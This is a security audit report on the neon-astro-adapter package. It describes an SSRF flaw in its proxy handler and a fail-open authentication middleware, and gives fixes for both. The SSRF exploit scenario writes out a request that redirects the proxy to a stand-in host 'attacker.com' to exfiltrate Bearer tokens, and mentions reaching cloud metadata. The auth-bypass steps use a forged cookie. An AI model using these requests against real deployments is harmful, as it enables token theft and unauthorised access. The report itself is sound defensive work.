# Security Review — neon-astro-adapter
**Date:** 2026-06-28  
**Scope:** Full codebase (clean main branch — no diff, full package scan)  
**Commit:** 9539985 (v1.0.1)

---

## Summary

| # | File | Severity | Category | Confidence |
|---|------|----------|----------|------------|
| 1 | `src/server/handler.ts:49-81` | **HIGH** | SSRF | 9/10 |
| 2 | `src/server/middleware.ts:131-133` | **MEDIUM** | Auth Bypass (fail-open) | 8/10 |

---

## Finding 1 — `src/server/handler.ts:49–53,80–81` — HIGH — SSRF

### Description
`buildUpstreamUrl` passes the user-controlled `path` (derived from `context.params.slug.join('/')`) directly to `new URL(path, base)`. The Web API `URL` constructor ignores `base` when `path` is an absolute URL. An attacker can craft a request whose Astro `[...slug]` segments produce an absolute URL, redirecting the proxy fetch to an arbitrary host.

**Vulnerable code:**
```ts
// handler.ts:80–81
const path = context.params.slug.join('/');
const upstreamUrl = buildUpstreamUrl(baseUrl, path, context.request.url);

// handler.ts:51
const upstreamUrl = new URL(path, normalizedBase + '/');  // ← base ignored when path is absolute
```

### Exploit Scenario
```
GET /api/auth/https://attacker.com/steal HTTP/1.1
Authorization: Bearer <user-token>
```

Astro parses the slug as `['https:', '', 'attacker.com', 'steal']`.  
`slug.join('/') → 'https://attacker.com/steal'`  
`new URL('https://attacker.com/steal', 'https://auth.neon.tech/')` → `https://attacker.com/steal`

The server then fetches `https://attacker.com/steal` with the proxied headers `authorization`, `user-agent`, `referer`, `content-type`, and `origin` — exfiltrating the user's Bearer token to the attacker.

Secondary attack: reach internal services not exposed to the internet (cloud metadata at `http://169.254.169.254`, internal auth endpoints, etc.).

### Recommendation
Validate that the upstream URL's origin matches the configured `baseUrl` origin before fetching:

```ts
function buildUpstreamUrl(baseUrl: string, path: string, originalUrl: string): URL {
  const normalizedBase = baseUrl.replace(/\/+$/, '');
  const baseOrigin = new URL(normalizedBase).origin;

  // Strip any leading slashes and encode the path to prevent scheme injection
  const safePath = path.replace(/^\/+/, '');
  const upstreamUrl = new URL(safePath, normalizedBase + '/');

  // Hard guard: reject if the resolved host differs from the configured base
  if (upstreamUrl.origin !== baseOrigin) {
    throw new Error(`Blocked upstream request to disallowed host: ${upstreamUrl.origin}`);
  }

  upstreamUrl.search = new URL(originalUrl).search;
  return upstreamUrl;
}
```

Alternatively, strip any scheme-like prefix from `path` before constructing the URL:
```ts
const safePath = path.replace(/^[a-zA-Z][a-zA-Z0-9+\-.]*:\/\//, '');
```

---

## Finding 2 — `src/server/middleware.ts:131–133` — MEDIUM — Auth Bypass (Fail-Open)

### Description
When the outbound `/get-session` request to the Neon Auth server fails (network error, timeout), the middleware calls `next()` and allows the request through. Combined with the trivial session-cookie *name presence* check at line 121 (which does not validate the cookie value), any request that includes a cookie header containing the string `__Secure-neon-auth.session_token` bypasses authentication if the auth server is unreachable.

**Vulnerable code:**
```ts
// middleware.ts:121 — presence check, not validity check
if (!cookieHeader.includes(NEON_AUTH_SESSION_COOKIE_NAME)) {
  return context.redirect(loginUrl);
}

// middleware.ts:131–133 — fail-open
} catch {
  return next();   // ← grants access on network failure
}
```

### Exploit Scenario
1. Attacker sends any request with `Cookie: __Secure-neon-auth.session_token=INVALID`.
2. Attacker causes the Neon Auth server to be unreachable (DDoS, DNS poisoning, or a network partition between app and auth server).
3. The `fetch()` to `/get-session` throws. The `catch` block calls `next()`.
4. Attacker accesses protected pages without a valid session.

This is currently tested and documented as "graceful degradation" (`middleware.test.ts:188`), indicating it is an intentional design choice. However, fail-open is considered a security anti-pattern for auth middleware.

### Recommendation
Change the catch block to deny access (fail-closed) rather than grant it. If high availability is a requirement, consider a secondary cache (e.g., a short-lived verified-session flag stored server-side) rather than skipping validation entirely:

```ts
} catch {
  // Fail-closed: auth server unreachable → deny, not allow
  return context.redirect(loginUrl);
}
```

If fail-open is intentionally required for UX reasons, document the trade-off explicitly and consider limiting it to read-only routes only.

---

## Suppressed Findings (Confidence < 8/10)

| Category | Location | Confidence | Reason Suppressed |
|----------|----------|------------|-------------------|
| Auth bypass via `startsWith` prefix match | `middleware.ts:116` | 6/10 | Requires developer to coincidentally create a page whose path starts with a hardcoded skip route — low practical likelihood |
| `decodeURIComponent` throw on malformed cookie value | `middleware.ts:71` | 6/10 | Requires upstream Neon Auth server to return a malformed Set-Cookie header — upstream is trusted |
| Full cookie header forwarded to `/get-session` | `middleware.ts:128-129` | 6/10 | Neon Auth server is trusted; forwarding all cookies may be intentional for session context |

---

## Notes

- `config.cookies.secret` is validated (≥32 chars, required) but not used in any cryptographic operation in the adapter — session signing is fully delegated to the upstream. This is a design observation, not a vulnerability.
- RESPONSE_HEADERS_ALLOWLIST in `handler.ts` correctly prevents header injection from the upstream response into the client response.
- Cookie proxying in `handler.ts` correctly filters to only `__Secure-neon-auth.*` prefixed cookies — good defensive pattern.
